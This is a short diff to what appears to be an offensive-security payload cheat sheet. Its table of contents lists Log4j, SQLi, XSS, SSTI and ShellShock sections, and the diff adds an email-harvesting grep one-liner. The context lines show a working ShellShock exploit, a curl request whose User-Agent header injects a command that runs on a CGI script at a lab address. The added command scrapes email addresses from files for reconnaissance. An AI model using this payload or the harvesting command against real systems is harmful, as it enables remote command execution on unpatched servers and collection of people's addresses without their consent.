@@ -95,6 +95,7 @@
   - [SMTP](#smtp)
   - [SQLi+XSS+SSTI](#sqli-xss-ssti)
   - [ShellShock](#shellshock)
+  - [grep emails](#grep-emails)
 -------------------------------------------------------------------------------------------------------------
 # Payloads
 ## Log4j
@@ -2127,6 +2128,11 @@ sudo apt install evolution
 `exploit by curl`
 ```
 curl -H 'User-Agent: () { :; }; echo ; echo ; /usr/bin/id' bash -s :'' http://10.10.10.56/cgi-bin/user.sh
+```
+### grep emails
+
+```
+grep -Eiorh '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})' "$@" file.txt | sort | uniq > emails.txt
 ```
 ----------------------------------------------------------------------------------------------------------
 
